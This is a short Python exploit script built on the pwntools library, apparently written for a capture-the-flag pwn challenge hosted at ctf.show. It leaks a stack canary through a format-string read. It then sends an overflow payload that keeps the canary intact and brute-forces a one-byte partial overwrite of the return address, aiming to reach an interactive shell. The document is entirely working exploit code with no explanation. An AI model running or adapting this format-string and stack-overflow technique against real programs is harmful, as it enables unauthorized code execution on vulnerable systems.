from pwn import * 
from LibcSearcher import * 
context.log_level = 'debug' 

for i in range(256):
    try:
        i+=14
        p = remote('pwn.challenge.ctf.show', 28107)
        # elf=ELF('./tang')
        p.recvuntil(b'\n')
        p.sendline('%9$p')
        # print(p.recv(14))
        # pause()
        canary=int(p.recv(18).decode(),16)
        print(hex(canary))
        # main_addr=getstack-100
        # _rtld_global=getstack-122
        # libc=LibcSearcher("__libc_start_main",getstack)
        # print(libc.dump('puts'))
        # print(hex(getstack))

        p.recvuntil(b'\n')
        p.sendline(b'aaa')
        p.recvuntil(b'\n')
        payload=b'a'*0x38+p64(canary)+b'a'*0x18+p8(i+1)
        p.send(payload)
        aaa=p.recv()
        print(aaa)
        if aaa=='timeout: the monitored command dumped core\n':
            break
        p.interactive() 
    except:
        print('except:',i+1)
        pause()
         

